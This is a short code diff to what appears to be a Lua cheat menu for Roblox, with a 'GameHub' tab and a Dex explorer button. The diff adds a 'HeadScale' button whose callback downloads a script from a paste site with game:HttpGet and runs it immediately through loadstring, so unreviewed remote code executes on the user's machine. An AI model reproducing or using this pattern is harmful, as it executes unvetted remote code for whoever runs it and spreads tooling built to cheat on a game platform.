@@ -78,7 +78,14 @@ local Tab = GUI:Tab{
 Name = "GameHub",
 Icon = "rbxassetid://8569322835"
 }
-        
+
+Tab:Button{
+	Name = "HeadScale",
+	Description = nil,
+	Callback = function()
+	loadstring(game:HttpGet("https://pastefy.app/rmpKKaRe/raw", true))()
+	end
+}
 Tab:Button{
 	Name = "DexLastVersionPC&MOBILE",
 	Description = nil,
